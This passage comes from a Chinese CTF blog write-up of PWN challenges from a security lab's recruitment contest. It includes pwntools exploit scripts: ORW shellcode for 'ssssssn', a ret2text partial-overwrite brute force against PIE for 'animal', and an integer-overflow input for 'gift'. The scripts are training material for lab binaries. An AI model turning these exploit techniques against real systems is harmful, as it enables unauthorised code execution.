class="built_in">int</span>,subprocess.check_output([<span class="string">'one_gadget'</span>,<span class="string">'--raw'</span>,<span class="string">'-f'</span>,libc.path]).decode().strip(<span class="string">'\n'</span>).split(<span class="string">' '</span>))) <span class="keyword">if</span> path == null <span class="keyword">else</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,subprocess.check_output([<span class="string">'one_gadget'</span>,<span class="string">'--raw'</span>,<span class="string">'-f'</span>,path]).decode().strip(<span class="string">'\n'</span>).split(<span class="string">' '</span>)))</span><br><span class="line">clear   = <span class="keyword">lambda</span>                    :os.system(<span class="string">'clear'</span>)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">'\x1b[01;38;5;214m{} = {:#x}\x1b[0m'</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">li      = <span class="keyword">lambda</span> x                  :log.info(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------- func zone --------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb attach</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">""</span></span>):</span><br><span class="line">    gdb.attach(sh,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remote or local </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proloc</span>(<span class="params">elf_addr,libc_addr,pro_libc</span>):</span><br><span class="line">    <span class="keyword">global</span> sh, elf, libc</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> :</span><br><span class="line">        ip      =   sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)[<span class="number">0</span>]</span><br><span class="line">        prot    =   sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)[<span class="number">0</span>]</span><br><span class="line">        sh      =   remote(ip,prot)</span><br><span class="line">        libc    =   pro_libc</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sh      =   process(elf_addr) </span><br><span class="line">        elf     =   ELF(elf_addr)</span><br><span class="line">        libc    =   elf.libc    <span class="comment">#ELF(libc_addr, checksec=False)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------- code zone --------------------------------------------------------#</span></span><br><span class="line"><span class="comment"># ORW</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    code = [</span><br><span class="line">        asm(<span class="string">'mov rdx, 0x100'</span>),</span><br><span class="line">        asm(<span class="string">'xor rax, rax'</span>),</span><br><span class="line">        asm(<span class="string">'syscall'</span>),</span><br><span class="line">    ]</span><br><span class="line">    payload1 =  <span class="string">b""</span>.join(code)</span><br><span class="line">    sa(<span class="string">"you can input only 13 messages:\n"</span>, payload1)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    payload2 = (flat(<span class="string">b'\x90'</span>*<span class="built_in">len</span>(payload1), asm(shellcraft.<span class="built_in">open</span>(<span class="string">"flag"</span>)), asm(shellcraft.read(<span class="string">"rax"</span>, <span class="string">"rsp"</span>, <span class="number">0x100</span>)), asm(shellcraft.write(<span class="number">1</span>, <span class="string">"rsp"</span>, <span class="number">0x100</span>)))).ljust(<span class="number">0x100</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">    sl(payload2)</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    elf_addr    =   <span class="string">'./ssssssn'</span>                         <span class="comment"># local ELF</span></span><br><span class="line">    libc_addr   =   <span class="string">''</span>                                  <span class="comment"># local Libc</span></span><br><span class="line">    pro_libc    =   <span class="string">''</span>                                  <span class="comment"># remote Libc</span></span><br><span class="line">    proloc(elf_addr, libc_addr, pro_libc)</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="animal"><a href="#animal" class="headerlink" title="animal"></a>animal</h2><ol>
+<li><p>checkseck发现开启了堆栈不可执行和地址随机化</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127192045.png"></p>
+</li>
+<li><p>IDA分析为C++编写，getAnimal函数可以泄露地址，backdoor函数存在栈溢出漏洞，shell函数可以执行system命令。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127192108.png"></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127192119.png"></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127192131.png"></p>
+</li>
+<li><p>输入的内容不为1或2，跳转至backdoor函数，利用栈溢出ret2text，跳转到system(‘/bin/sh’)的地址即可命令执行。由于开启了PIE，shell最后三位地址不变，因此我们可以通过覆盖地址的后3位实现跳转至shell函数。由于至少要覆盖4位，倒数第四位需要爆破，爆破范围在0到0xf。</p>
+</li>
+<li><p>脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment"># gdb.attach(p,"b backdoor")</span></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">list1 = [<span class="string">"\x05"</span>,<span class="string">"\x15"</span>,<span class="string">"\x25"</span>,<span class="string">"\x35"</span>,<span class="string">"\x45"</span>,<span class="string">"\x55"</span>,<span class="string">"\x65"</span>,<span class="string">"\x75"</span>,<span class="string">"\x85"</span>,<span class="string">"\x95"</span>,<span class="string">"\xa5"</span>,<span class="string">"\xb5"</span>,<span class="string">"\xc5"</span>,<span class="string">"\xd5"</span>,<span class="string">"\xe5"</span>,<span class="string">"\xf5"</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sh = process(<span class="string">'./animal'</span>)</span><br><span class="line">    payload = <span class="string">'A'</span> * <span class="number">16</span>+<span class="string">'BBBBBBBB'</span>+<span class="string">'\x66'</span>+random.sample(list1,<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">    sh.sendafter(<span class="string">"3.show\n"</span>,<span class="string">'11'</span>)</span><br><span class="line">    sh.sendafter(<span class="string">"leave lase message\n"</span>, payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh.recv(timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sh.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="gift"><a href="#gift" class="headerlink" title="gift"></a>gift</h2><ol>
+<li><p>IDA分析发现需使int型变量<code>v4&lt;=5 &amp;&amp; v4-1&gt;5</code>才能执行系统命令。显然是整数溢出，输入最小的int型整数（-2147483648）即可。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127192258.png"></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127192314.png"></p>
+</li>
+</ol>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>李钰璕
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://leeyuxun.github.io/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BPWN-WriteUp.html" title="弱口令安全实验室招新赛PWN-WriteUp">https://leeyuxun.github.io/弱口令安全实验室招新赛PWN-WriteUp.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-cn" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/PWN/" rel="tag"><i class="fa fa-tag"></i> PWN</a>
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/Cacti%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88.html" rel="prev" title="Cacti漏洞集合">
+      <i class="fa fa-chevron-left"></i> Cacti漏洞集合
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Game"><span class="nav-number">1.</span> <span class="nav-text">Game</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stackoverflow"><span class="nav-number">2.</span> <span class="nav-text">stackoverflow</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssssssn"><span class="nav-number">3.</span> <span class="nav-text">ssssssn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#animal"><span class="nav-number">4.</span> <span class="nav-text">animal</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gift"><span class="nav-number">5.</span> <span class="nav-text">gift</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="李钰璕"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">李钰璕</p>
+  <div class="site-description" itemprop="description">安全学习笔记</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">89</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">115</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Leeyuxun" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Leeyuxun" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:leeyuxun@163.com" title="E-Mail → mailto:leeyuxun@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <!--
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">李钰璕</span>
+</div>
+-->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = 'true';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+</body>
+</html>
